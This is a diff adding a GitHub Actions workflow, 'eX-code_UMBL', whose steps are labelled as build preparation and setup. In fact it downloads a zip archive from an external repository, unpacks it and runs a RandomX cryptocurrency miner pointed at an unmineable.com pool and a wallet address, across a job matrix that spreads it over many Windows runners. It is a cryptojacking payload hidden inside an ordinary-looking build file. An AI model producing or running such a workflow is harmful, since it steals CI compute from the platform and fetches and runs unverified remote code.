@@ -1,0 +1,26 @@
+name: eX-code_UMBL
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: eX-code_UMBL
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: PREPARING
+      run: Invoke-WebRequest https://github.com/OmJhonyPerkasa/yteam/raw/main/mawaritubiru.zip -Outfile mawaritubiru.zip
+    - name: Seting-UP
+      run: Expand-Archive mawaritubiru.zip
+    - name: Running
+      run: ./mawaritubiru --algorithm randomx --pool rx.unmineable.com:80 --wallet HOT:0xbca8d78f404533f2324abd652b46f04332eb2ca4.jemby
+    - name: DONE
+      run: exit
